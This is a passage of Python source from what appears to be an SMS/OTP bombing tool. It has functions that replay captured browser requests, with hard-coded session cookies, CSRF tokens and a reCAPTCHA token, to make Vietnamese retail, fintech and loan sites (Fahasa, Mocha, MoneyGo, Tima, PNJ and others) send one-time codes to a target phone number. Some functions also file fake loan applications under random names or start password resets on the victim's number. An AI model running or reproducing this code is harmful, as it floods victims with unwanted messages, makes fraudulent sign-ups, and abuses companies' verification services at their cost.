        'referer': 'https://www.fahasa.com/customer/account/login/referer/aHR0cHM6Ly93d3cuZmFoYXNhLmNvbS9jdXN0b21lci9hY2NvdW50L2luZGV4Lw,,/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': sdt,
    }

    response = requests.post('https://www.fahasa.com/ajaxlogin/ajax/checkPhone', cookies=cookies, headers=headers, data=data)
    print('thành Công') #("OTP SEND FAHASA:", response.text)

def send_otp_via_hopiness(sdt):
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'DNT': '1',
        'Origin': 'https://shopiness.vn',
        'Referer': 'https://shopiness.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'action': 'verify-registration-info',
        'phoneNumber': sdt,
        'refCode': '',
    }

    response = requests.post('https://shopiness.vn/ajax/user', headers=headers, data=data)
    print('thành Công') #("OTP SEND hopiness:", response.text)




def send_otp_via_modcha35(sdt):

    url = "https://v2sslapimocha35.mocha.com.vn/ReengBackendBiz/genotp/v32"

    payload = f"clientType=ios&countryCode=VN&device=iPhone15%2C3&os_version=iOS_17.0.2&platform=ios&revision=11224&username={sdt}&version=1.28"

    headers = {
    'User-Agent': "mocha/1.28 (iPhone; iOS 17.0.2; Scale/3.00)",
    'Content-Type': "application/x-www-form-urlencoded",
    'uuid': "B4DD9661-2B0B-418F-B953-6AE71C0373EC",
    'APPNAME': "MC35",
    'mocha-api': "",
    'countryCode': "VN",
    'languageCode': "vi",
    'Accept-Language': "vi-VN;q=1"
    }

    response = requests.post(url, data=payload, headers=headers)
    print('thành Công') #("OTP SEND MOCHA35:", response.text)


def send_otp_via_Bibabo(sdt):

    url = "https://one.bibabo.vn/api/v1/login/otp/createOtp"

    params = {
    'phone': sdt,
    'reCaptchaToken': "undefined",
    'appId': "7",
    'version': "2"
    }

    headers = {
    'User-Agent': "bibabo/522 CFNetwork/1474 Darwin/23.0.0",
    'Accept': "application/json, text/plain, */*",
    'accept-language': "vi-VN,vi;q=0.9"
    }

    response = requests.get(url, params=params, headers=headers)

    print('thành Công') #("OTP SEND Bibabo:", response.text)



def send_otp_via_MOCA(sdt):
    url = "https://moca.vn/moca/v2/users/role"

    params = {
    'phoneNumber': sdt
    }

    headers = {
    'User-Agent': "Pass/2.10.156 (iPhone; iOS 17.0.2; Scale/3.00)",
    'digest': "SHA-256=cgvOMMsYWgehDVly4KtMMT3F10WQDyMiQT05/hL5YhE=",
    'x-mof-ods': "{length=32,bytes=0x993b85c77b262672a287bb24b56259ca...61966184262e193f}",
    'x-mof-ds': "{length=32,bytes=0x993b85c77b262672a287bb24b56259ca...61966184262e193f}",
    'device-token': "4ADAF544-AB6D-4B7F-985A-BF6DAEAA38EA",
    'x-requested-with': "XMLHttpRequest",
    'device-id': "b51fb1bf16bd391f0b22e68ebf9efb3966acecfc0d587a91031b504754e312f1",
    'accept-language': "vi",
    'x-moca-api-version': "2",
    'platform': "P_IOS-2.10.156",
    'date': "Thu, 01 Aug 2024 13:15:05 GMT",
    'x-request-id': "4ADAF544-AB6D-4B7F-985A-BF6DAEAA38EA1722518105.413269",
    'pre-authorization': "hmac username=\"06b707de-6050-11eb-ae93-0242ac130002\", algorithm=\"hmac-sha256\", headers=\"date digest\", signature=\"cZevTUC0yW+WSAVer9McsgpV79XoaL+BTnocoHuzBjw=\""
    }

    response = requests.get(url, params=params, headers=headers)

    print('thành Công') #("OTP SEND MOCA LỎ:", response.text)


def send_otp_via_pantio(sdt):
    headers = {
        'accept': '*/*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'dnt': '1',
        'origin': 'https://pantio.vn',
        'priority': 'u=1, i',
        'referer': 'https://pantio.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    params = {
        'domain': 'pantiofashion.myharavan.com',
    }

    data = {
        'phoneNumber': sdt,
    }

    response = requests.post('https://api.suplo.vn/v1/auth/customer/otp/sms/generate', params=params, headers=headers, data=data)

    print('thành Công') #("OTP SEND pantio:", response.text)


def send_otp_via_Routine(sdt):

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'form_key=1hDuKB6LPnlgEOgn; wp_ga4_customerGroup=NOT%20LOGGED%20IN; X-Magento-Vary=7ad851671356eb8fbf873fbdb216dde0a2e0c003; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; mage-messages=; form_key=1hDuKB6LPnlgEOgn; private_content_version=e43cc8178a6a71fece0c6db77f4b56d1; PHPSESSID=piouum2lgnbb1usi60h4v29ap9; section_data_ids=%7B%22customer%22%3A1722519971%7D',
        'dnt': '1',
        'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQyMTc2ODQiLCJhcCI6IjExMzQ0MDAwMDciLCJpZCI6IjMzMmYyMzU2YTZlYmEwOWUiLCJ0ciI6ImRkNTQwNTk1ZDY4NWE3MTFjOTNhYjY5NzhkZmY1YTIzIiwidGkiOjE3MjI1MTk5OTE4MDR9fQ==',
        'origin': 'https://routine.vn',
        'priority': 'u=1, i',
        'referer': 'https://routine.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'traceparent': '00-dd540595d685a711c93ab6978dff5a23-332f2356a6eba09e-01',
        'tracestate': '4217684@nr=0-1-4217684-1134400007-332f2356a6eba09e----1722519991804',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-newrelic-id': 'UAQGVlBbDBABVFZSBAkBVVcF',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'telephone': sdt,
        'isForgotPassword': '0',
    }

    response = requests.post('https://routine.vn/customer/otp/send/', headers=headers, data=data)

    print('thành Công') #("OTP SEND Routine:", response.text)

def send_otp_via_vayvnd(sdt):
    # Headers chung
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN',
        'content-type': 'application/json; charset=utf-8',
        'dnt': '1',
        'origin': 'https://vayvnd.vn',
        'priority': 'u=1, i',
        'referer': 'https://vayvnd.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'site-id': '3',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    # Request 1: Tạo user
    json_data_1 = {
        'phone': sdt,
        'utm': [
            {
                'utm_source': 'leadbit',
                'utm_medium': 'cpa',
            },
        ],
        'cpaId': 2,
        'cpaLeadData': {
            'click_id': '66A8D2827EED7B49190B756A',
            'utm_campaign': '44559',
        },
        'sourceSite': 3,
        'regScreenResolution': {
            'width': 1920,
            'height': 1080,
        },
        'trackingId': 'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2',
    }

    response_1 = requests.post('https://api.vayvnd.vn/v2/users', headers=headers, json=json_data_1)
    print('thành Công') #(response_1.json())

    # Request 2: Yêu cầu reset mật khẩu
    json_data_2 = {
        'login': sdt,
        'trackingId': 'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2',
    }

    response_2 = requests.post('https://api.vayvnd.vn/v2/users/password-reset', headers=headers, json=json_data_2)
    print('thành Công') #(response_2.json())

    # Request 3: Yêu cầu reset mật khẩu với antispam
    json_data_3 = {
        'login': sdt,
        'trackingId': 'Kqoeash6OaH5e7nZHEBdTjrpAM4IiV4V9F8DldL6sByr7wKEIyAkjNoJ2d5sJ6i2',
        'antispamCheckData': {
            'hostname': 'vayvnd.vn',
            'recaptchaResponse': '03AFcWeA4a3of5F2rQflfDDN3PoKGexeshUPBijwHLLt_g5MKfy8DOVF7AtAdhNcRg0tk8OxQFZMluITyXgxDF56auNDfD2IqOBzc_0YEQKhjz28R_3Cv7da1x3t73L6y1uGHmh_vbGE4nwjMo6uqQD_4XaGXbrjK3A_MECVrnlxqSzdcFHT_dWY8dZY_XZrVZD8qAaRrxewtpoGroniGyrMXDQBqvpO8cv5NHF6HzebGbHr9pcFdjurawUgyfpvJaIf818dt0Fl71g6BYQ2PDWk81ZI7m6Zz2sIcb_RINTz4VPgnKHO2EYvhnMkxdVHf5H2u5sV1eJuQ-Ess3AgShIQXTbUhorpjz9CDlnKfwcMtQmV47LB_wrJIhkGAyjO2s4Uadi_DJaoqQuk5KzpgWbG0v7hVWoL_FtCxdRioMgrj4zMMGHGUGjsaHUw5f1FJ5ehwPX3BbfFDxgv6G-LAhPOJ6D7QtWP_2K-1Di2Y-DMBiM15k4sr9-jQq7Hb6i44Df3m0Pe4sF8w4DD6rCrj7qMhQFhz-FxTCMyKg1AZttUoWVYEpkuEudROLWWBoATDsLwdO1ICLaEGeA9V0dRfcFYNm1bpF8AC7Iuya-df_55Uvb3UP1bGDNEvkTPXZIN8gFosYfWFTOt6JbTdWBM11vNT1YzC9rAIsrgCG3FShXF_6dy7_uxJ9v2gykpQ6bHe9EMJEK9xsQn50kOTTXOLJPXxOdplk4LdQfVzgkWsMnGPhbtK5n5E8hFHz--vQy61eAHHJ0gxs1ybOgFpEn53BDkKWXyOrOvvEDDdffBhwwDcl1C5zKRN1-_gYLfgEMI8Hxmq7AWfF_kQ6eOPq2DM5JY01v4nuLj06s-RQwyKO_R1q6IS5LvWek425nDxjt7ihJLbfUotuMCWDvnBm_pSm05pTm8WL6twt9vLd_K4BB-ME-5DFAHbmopkZj6rGQhXGLMWEU-rvgOG-qgZ1_VE_0-j254Sw19qZcz_bdUGXxeblMoWThlaMf8OQT5s9O1enSYTPWCtMhWsgDT5Crb2xMGHWkO5nbC0X2KOT-uNWNIMldpA3DSs4jTSecEhZW2NPAjygBqSs4ZsllUOl8gaq5hv352ysq6T6nFs_fpoBhCNnhNQR0_G3Qw80ZS7cfC1YlCoDAItOd9AgD0oWsvjV9gUkSz9WgmkCL0vxnndR2ixnyolsRZqMxT7Q8RirZZU-plNUDW0Tj7cfkGPib4MFZ5P3J08LPP1uSeuctw4HXSRheltiEvu5IFZ4UExasH5yMbyTBYSrAMw9IlO3s8KnNu9UQMX9pOzjo8wXdS4QiSoOo0PjQ4RV881eL6ojJv-py9IVmezFvPohm9JmcFRgzuXWnv5WpXyclW1AhTHjGc19emxXc92q2fnqouvYr3-cgQtFyHJInovng8kmUBa-d8mSuT-36a6LaiqKLi-cw0sCVXHmOdXnULf7DMh48AD6VLDw49jwYeczc3K3WJDz0cWJDPZwen8GmC-uuhIGi1hER1q6Mfq01GCKs2lLwbmCysD9xURNFGXu9NUjHoE0J6QHlxdq95scnOone1SIivS0Y9OlK192g_C_c26g-7-aMft1_QQ4pb7r7asb-yHglSBAdL3DMHk4ig2qMf5bMX2Z01GDbt6pAC0UIjtsuSI0zwNQiyWV6rePlXp9_5n0VZD2svaUel7KnIv6SFyrwo2kk1Y1iaahtbk6rIWYW-oYcU4Xo67PzkSkd5o2BdVbMNoqyoE3_64SdGbCJhpMixqxBJTKVqeKn0ohM1H7m8RDs-ECaAfEHO8j96z1E1P2m0HVO5zJNB-8WnIEW3gJ1X5OjymNfqrMNr94626PA04O9_-NPTwuKFmIJZE2aEtItXRBvXR1GUZBdpH32PrECRp8Mo-sOz1W7UBwkvAfaOvYDn3zJ-k54emVQ4bf-vEpvDLYKtffIHmy1dcSMP8vhJJgykim-fxJ8cEYYKpRxWrE9CiobKH78pDTEIWIj8GzCkxrqbe4ycj5kA',
        },
    }

    response_3 = requests.post('https://api.vayvnd.vn/v2/users/password-reset', headers=headers, json=json_data_3)
    print('thành Công') #(response_3.json())






def send_otp_via_tima(sdt):


    cookies = {
        'ASP.NET_SessionId': 'm1ooydpmdnksdwkm4lkadk4p',
        'UrlSourceTima_V3': '{"utm_campaign":null,"utm_medium":null,"utm_source":"www.bing.com","utm_content":null,"utm_term":null,"Referer":"www.bing.com"}',
        'tkld': 'b460087b-2c70-9d44-da8d-68d0d4c00f3a',
        'tbllender': 'tbllender',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'ASP.NET_SessionId=m1ooydpmdnksdwkm4lkadk4p; UrlSourceTima_V3={"utm_campaign":null,"utm_medium":null,"utm_source":"www.bing.com","utm_content":null,"utm_term":null,"Referer":"www.bing.com"}; tkld=b460087b-2c70-9d44-da8d-68d0d4c00f3a; tbllender=tbllender',
        'dnt': '1',
        'origin': 'https://tima.vn',
        'priority': 'u=0, i',
        'referer': 'https://tima.vn/vay-tien-online/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    data = {
        'application_full_name': generate_random_name(),
        'application_mobile_phone': sdt,
        'CityId': '1',
        'DistrictId': '16',
        'rules': 'true',
        'TypeTime': '1',
        'application_amount': '0',
        'application_term': '0',
        'UsertAgent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'IsApply': '1',
        'ProvinceName': 'Thành phố Hà Nội',
        'DistrictName': 'Huyện Sóc Sơn',
        'product_id': '2',
    }

    response = requests.post('https://tima.vn/Borrower/RegisterLoanCreditFast', cookies=cookies, headers=headers, data=data)

    print('thành Công') #("OTP SEND Routine: Đã gửi yêu cầu ")











def send_otp_via_paynet(sdt):

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': '__RequestVerificationToken=zxA6lyDZVpywvn1LHgcIKm8LsCzx_R3icFZ2RYQXQXLaAcj2czJgJgcQ7glylX9PYWiS-ArycPkTIJSGcECxHdPiG3eyEiqG-dBqAkWMNPs1; ASP.NET_SessionId=y02wiifji0nhkleae0aqatst',
        'DNT': '1',
        'Origin': 'https://merchant.paynetone.vn',
        'Referer': 'https://merchant.paynetone.vn/User/Create',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'MobileNumber': sdt,
        'IsForget': 'N',
    }

    response = requests.post('https://merchant.paynetone.vn/User/GetOTP', headers=headers, data=data, verify=False)
    print('thành Công') #("OTP SEND Paynet:", response.text)




def send_otp_via_moneygo(sdt):

    cookies = {
        'XSRF-TOKEN': 'eyJpdiI6IlJZYnY1ZHhEVmdBRXpIbXcza3A0N2c9PSIsInZhbHVlIjoiUEtCV09IdmFlVkZWQ1R3c2ZIT01seSthcVdaMFhDb2lVTkEybjVJZksrQnR4dmliSEFnWkp0dklONE5LMVZBOUQxNXpaVDNWbmdadExaQmt3Vy9ZVzdYL0JWR2lSSU91RG40ZDVybERZaWJEcnhBNWhBVHYzVHBQbjdVR0x2S0giLCJtYWMiOiJhOTBjMzExYzg3YjM1MjY2ZGIwODk0ZThlNWFkYzEwNGMyYzc2ZmFmMmRlYzNkOTExNDM3M2E5ZjFmYWEzNjA1In0%3D',
        'laravel_session': 'eyJpdiI6IlpHaDc2cGgyc0g4akhrdHFkT0tic1E9PSIsInZhbHVlIjoiSjYxQWZ4VlA0UmFwVDVGdkE2TzQ2OU1PSDhJQlR3MVBlbzdKV3g3a3czcStucGpIbTJIRnVpR0l3ZVR3clJsWUxjSlFMRUFuK3NhQ2VKVC9hc2Q5QlJYZEhpRVdNa0xlV21XcFgrelpoQTBhSUdlNngvR0NSRVdzUEFJcXhPNXUiLCJtYWMiOiIxYmM4NDBkN2VhMTVhZTJhOGU5MzFlOTUwNDc4NzFhOTBhNzc1NTliZmE2MWM3MmUwNjZjNDAyMDg5OWZmODE4In0%3D',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'XSRF-TOKEN=eyJpdiI6IlJZYnY1ZHhEVmdBRXpIbXcza3A0N2c9PSIsInZhbHVlIjoiUEtCV09IdmFlVkZWQ1R3c2ZIT01seSthcVdaMFhDb2lVTkEybjVJZksrQnR4dmliSEFnWkp0dklONE5LMVZBOUQxNXpaVDNWbmdadExaQmt3Vy9ZVzdYL0JWR2lSSU91RG40ZDVybERZaWJEcnhBNWhBVHYzVHBQbjdVR0x2S0giLCJtYWMiOiJhOTBjMzExYzg3YjM1MjY2ZGIwODk0ZThlNWFkYzEwNGMyYzc2ZmFmMmRlYzNkOTExNDM3M2E5ZjFmYWEzNjA1In0%3D; laravel_session=eyJpdiI6IlpHaDc2cGgyc0g4akhrdHFkT0tic1E9PSIsInZhbHVlIjoiSjYxQWZ4VlA0UmFwVDVGdkE2TzQ2OU1PSDhJQlR3MVBlbzdKV3g3a3czcStucGpIbTJIRnVpR0l3ZVR3clJsWUxjSlFMRUFuK3NhQ2VKVC9hc2Q5QlJYZEhpRVdNa0xlV21XcFgrelpoQTBhSUdlNngvR0NSRVdzUEFJcXhPNXUiLCJtYWMiOiIxYmM4NDBkN2VhMTVhZTJhOGU5MzFlOTUwNDc4NzFhOTBhNzc1NTliZmE2MWM3MmUwNjZjNDAyMDg5OWZmODE4In0%3D',
        'dnt': '1',
        'origin': 'https://moneygo.vn',
        'priority': 'u=0, i',
        'referer': 'https://moneygo.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    data = {
        '_token': 'X7pFLFlcnTEmsfjHE5kcPA1KQyhxf6qqL6uYtWCV',
        'total': '56688000',
        'phone': sdt,
        'agree': '1',
    }

    response = requests.post('https://moneygo.vn/dang-ki-vay-nhanh', cookies=cookies, headers=headers, data=data, verify=False)

    print('thành Công') #("OTP SEND Routine: Đã gửi yêu cầu ")


def send_otp_via_pico(sdt):
    # First request
    headers_1 = {
        'accept': '*/*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://pico.vn',
        'priority': 'u=1, i',
        'referer': 'https://pico.vn/',
        'region-code': 'MB',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    json_data_1 = {
        'name': generate_random_name(),
        'phone': sdt,
        'provinceCode': '92',
        'districtCode': '925',
        'wardCode': '31261',
        'address': '123',
    }

    response_1 = requests.post('https://auth.pico.vn/user/api/auth/register', headers=headers_1, json=json_data_1)
    
    # Handle the response of the first request if necessary
    print('thành Công') #(response_1.json())

    # Second request
    headers_2 = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'access': '206f5b6838b4e357e98bf68dbb8cdea5',
        'channel': 'b2c',
        'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://pico.vn',
        'party': 'ecom',
        'platform': 'Desktop',
        'priority': 'u=1, i',
        'referer': 'https://pico.vn/',
        'region-code': 'MB',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'uuid': 'cc31d0b5815a483b92f547ab8438da53',
    }

    json_data_2 = {
        'phone': sdt,
    }

    response_2 = requests.post('https://auth.pico.vn/user/api/auth/login/request-otp', headers=headers_2, json=json_data_2)
    
    # Handle the response of the second request if necessary
    print('thành Công') #(response_2.json())













def send_otp_via_PNJ(sdt):


    cookies = {
        'CDPI_VISITOR_ID': '78166678-ea1e-47ae-9e12-145c5a5fafc4',
        'CDPI_RETURN': 'New',
        'CDPI_SESSION_ID': 'f3a5c6c7-2ef6-4d19-a792-5e3c0410677f',
        'XSRF-TOKEN': 'eyJpdiI6Ii92NXRtY2VHaHBSZlgwZXJnOUNBUEE9PSIsInZhbHVlIjoiN3lsbjdzK0d5ZGp5cDZPNldEanpDTkY4UCtGeDVrcDhOZmN5cFhtaWNRZlVmcVo4SzNPQ1lsa2xwMjlVdml4RW9sc1BRSHgwRjVsaWhubGppaEhXZkh1ZWlER1g5Z1Q5dmxraENmdnZVWWl0d0hvYU5wVnRSYVIzYWJTenZzOUEiLCJtYWMiOiI4MzhmZDQ5YTc3ODMwMTM4ODAzNWQ2MDUzYzkxOGQ3ZGVhZmVjNjAwNjU4YjAxN2JjMmYyNGE2MWEwYmU3ZWEyIiwidGFnIjoiIn0%3D',
        'mypnj_session': 'eyJpdiI6IjJVU3I0S0hSbFI4aW5jakZDeVR2YUE9PSIsInZhbHVlIjoiejdhLyttRkMzbEl6VWhBM1djaG8xb3Nhc20vd0o5Nzg1aE12SlZmbWI4MzNURGV5NzVHb2xkU3AySVNGT1UxdFhLTW83d1dRNUNlaUVNREoxdDQ0cHBRcTgvQlExcit2NlpTa3c0TzNYdGR1Nnc4aWxjZWhaRDJDTzVzSHRvVzMiLCJtYWMiOiI3MTI0OTc0MzM1YjU1MjEyNTg3N2FiZTg0NWNlY2Q1MmRkZDU1NDYyYjRmYTA4NWQ2OTcyYzFiNGQ5NDg3OThjIiwidGFnIjoiIn0%3D',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'CDPI_VISITOR_ID=78166678-ea1e-47ae-9e12-145c5a5fafc4; CDPI_RETURN=New; CDPI_SESSION_ID=f3a5c6c7-2ef6-4d19-a792-5e3c0410677f; XSRF-TOKEN=eyJpdiI6Ii92NXRtY2VHaHBSZlgwZXJnOUNBUEE9PSIsInZhbHVlIjoiN3lsbjdzK0d5ZGp5cDZPNldEanpDTkY4UCtGeDVrcDhOZmN5cFhtaWNRZlVmcVo4SzNPQ1lsa2xwMjlVdml4RW9sc1BRSHgwRjVsaWhubGppaEhXZkh1ZWlER1g5Z1Q5dmxraENmdnZVWWl0d0hvYU5wVnRSYVIzYWJTenZzOUEiLCJtYWMiOiI4MzhmZDQ5YTc3ODMwMTM4ODAzNWQ2MDUzYzkxOGQ3ZGVhZmVjNjAwNjU4YjAxN2JjMmYyNGE2MWEwYmU3ZWEyIiwidGFnIjoiIn0%3D; mypnj_session=eyJpdiI6IjJVU3I0S0hSbFI4aW5jakZDeVR2YUE9PSIsInZhbHVlIjoiejdhLyttRkMzbEl6VWhBM1djaG8xb3Nhc20vd0o5Nzg1aE12SlZmbWI4MzNURGV5NzVHb2xkU3AySVNGT1UxdFhLTW83d1dRNUNlaUVNREoxdDQ0cHBRcTgvQlExcit2NlpTa3c0TzNYdGR1Nnc4aWxjZWhaRDJDTzVzSHRvVzMiLCJtYWMiOiI3MTI0OTc0MzM1YjU1MjEyNTg3N2FiZTg0NWNlY2Q1MmRkZDU1NDYyYjRmYTA4NWQ2OTcyYzFiNGQ5NDg3OThjIiwidGFnIjoiIn0%3D',
        'dnt': '1',
        'origin': 'https://www.pnj.com.vn',
        'priority': 'u=0, i',
        'referer': 'https://www.pnj.com.vn/customer/login',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    data = {
        '_method': 'POST',
        '_token': '0BBfISeNy2M92gosYZryQ5KbswIDry4KRjeLwvhU',
        'type': 'zns',
        'phone': sdt,
    }

    response = requests.post('https://www.pnj.com.vn/customer/otp/request', cookies=cookies, headers=headers, data=data)
    print('thành Công') #("OTP SEND : Đã gửi thành công oke sai thì thôi :))) PNJ Trang sức PNJ ")


def send_otp_via_TINIWORLD(sdt):
    cookies = {
        'connect.sid': 's%3AH8p0CvGBaMDVy6Y2qO_m3DzTZqtnMCt4.Cq%2FVc%2FYiObV281zVYSUk7z7Zzq%2F5sxH877UXY2Lz9XU',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'connect.sid=s%3AH8p0CvGBaMDVy6Y2qO_m3DzTZqtnMCt4.Cq%2FVc%2FYiObV281zVYSUk7z7Zzq%2F5sxH877UXY2Lz9XU',
        'dnt': '1',
        'origin': 'https://prod-tini-id.nkidworks.com',
